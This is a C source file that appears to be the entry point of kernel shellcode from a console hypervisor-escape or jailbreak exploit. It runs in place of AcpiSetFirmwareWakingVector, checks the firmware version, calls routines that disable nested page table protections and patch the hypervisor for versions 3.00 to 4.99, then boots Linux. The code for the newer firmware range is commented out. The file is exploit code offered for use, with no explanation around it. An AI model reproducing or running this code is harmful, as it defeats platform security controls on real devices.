#include "main.h"
#include "boot_linux.h"
#include "exploit_0304.h"
#include "utils.h"
#include <stddef.h>
#include <stdint.h>

shellcode_kernel_args args = {0};

// We are being called instead of AcpiSetFirmwareWakingVector
__attribute__((section(".entry_point"))) uint32_t main(uint64_t add1,
                                                       uint64_t add2) {
  // We will do main checks on .text only with a reference to .data
  volatile shellcode_kernel_args *args_ptr =
      (volatile shellcode_kernel_args
           *)0x11AA11AA11AA11AA; // To be replaced with proper address in .kdata

  // "Hide" the pointer from the optimizer
  __asm__ volatile("" : "+r"(args_ptr));

  // We don't have required information - Abort
  if ((args_ptr->fun_printf & 0xFFFF) == 0) {
    return -1;
  }

  activate_uart(args_ptr);

  if ((0x0300 <= args_ptr->fw_version) && (args_ptr->fw_version < 0x0500)) {
    if (disable_npts_0304(args_ptr))
      return -1;
    // Now we can R/W on .text
    init_global_pointers(args_ptr);
    patch_hv_0304();
  } else if ((0x0500 <= args_ptr->fw_version) &&
             (args_ptr->fw_version < 0x0650)) {
    // escape_hv_0506();
    // Now we can R/W on .text
    // init_global_pointers(args_ptr);
  } else {
    return 0;
  }

  boot_linux();
  printf("Linux prepared OK\n");

  printf("Good Bye VM :)\n");
  smp_rendezvous(smp_no_rendevous_barrier, vmmcall_dummy,
                 smp_no_rendevous_barrier, NULL);

  printf("We shouldn't be here :(\n");
  return 0;
}
